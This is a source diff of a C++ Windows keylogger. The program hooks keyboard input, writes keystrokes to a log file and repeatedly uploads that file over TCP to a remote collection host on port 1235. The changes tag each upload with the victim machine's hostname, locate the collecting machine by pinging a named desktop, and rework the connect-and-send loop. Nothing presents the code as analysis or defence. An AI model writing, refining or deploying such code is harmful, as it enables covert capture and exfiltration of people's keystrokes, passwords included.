@@ -16,12 +16,24 @@ bool shift = false;
 string logfile = "f.txt";
 string streamfile = "f.txt";
 
+string host = "";
 
-string SERVER_IP = "10.228.162.126";
+
+string SERVER_IP = "192.168.40.28";
 const int SERVER_PORT = 1235; 
 
+
+string gethost(){
+    FILE *f = popen("hostname", "r");
+    char buf[100];
+    fgets(buf, 100, f);
+    pclose(f);
+    string n = buf;
+    return n.substr(0, n.size()-1);
+}
+
 string findIp(string hostname) {
-    FILE *o = popen(("ping -a " + hostname).c_str(), "r");
+    FILE *o = popen(("ping /n 1 -a " + hostname + " -4").c_str(), "r");
     // Sleep(10000);
     string ip = "";
     // format: >Pinging I-ACL-PF3TWBVD [10.228.161.97] with 32 bytes of data:
@@ -90,7 +102,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 bool send(SOCKET sock){
     string size = filesize(streamfile.c_str());
-    string send = "\"keylog\\f.txt\""+size+"b";
+    string send = "\"" + host + "\\keylog\\f.txt\""+size+"b";
     sendstring(sock, send.c_str());
     bool b = sendfile(sock, streamfile.c_str());
     sendfile(sock, "b.txt");
@@ -107,38 +119,35 @@ int sender(){
     bool connected = false;
     bool foundIp = false;
 
-    // SERVER_IP = findIp("I-AET-PF4HB1GR");
 
-    // cout << SERVER_IP << "\n";
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        cout << "could not initialize winsock" << endl;
+        return 1;
+    }
+
 
     while (true){
 
-        WSADATA wsaData;
-        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-            cout << "could not initialize winsock" << endl;
-        }
-
-        sockaddr_in serverAddr{};
-        serverAddr.sin_family = AF_INET;
-        serverAddr.sin_port = htons(SERVER_PORT);
-        if (inet_pton(AF_INET, SERVER_IP.c_str(), &(serverAddr.sin_addr)) <= 0) {
-            cout << "invalid IP." << endl;
-        }
-
         SOCKET socket_fd;
 
-        while (!foundIp){
-            string IP = findIp("I-AET-PF4HB1GR");
+        while (!connected){
+            string IP = findIp("DESKTOP-29K26OS");
+            cout << IP << "\n";
             if (IP != "potato"){
                 SERVER_IP = IP;
                 foundIp = true;
             }
-            this_thread::sleep_until(chrono::system_clock::now()+chrono::seconds(2));
+            else continue;
 
-        }
+            sockaddr_in serverAddr{};
+            serverAddr.sin_family = AF_INET;
+            serverAddr.sin_port = htons(SERVER_PORT);
+            if (inet_pton(AF_INET, SERVER_IP.c_str(), &(serverAddr.sin_addr)) <= 0) {
+                cout << "invalid IP." << endl;
+            }   
 
-        while (!connected){
-            cout << SERVER_IP.length() << "\n";
+            connected = true;
             socket_fd = socket(AF_INET, SOCK_STREAM, 0);
             if (socket_fd == INVALID_SOCKET) {
                 cout << "could not make socket" << endl;
@@ -148,7 +157,6 @@ int sender(){
                 connected = false;
             }
 
-            connected = true;
             if (connect(socket_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
                 cout << "could not connect to server" << endl;
                 shutdown(socket_fd, SD_SEND);
@@ -160,7 +168,6 @@ int sender(){
         }
         cout << "sent\n";
         connected = send(socket_fd);
-        foundIp = connected;
         this_thread::sleep_until(chrono::system_clock::now()+chrono::seconds(2));
     } 
 }
@@ -180,6 +187,7 @@ void runlog(){
 
 int main(){
     
+    host = gethost();
     thread logger = thread(runlog);
     thread tcp = thread(sender);
 
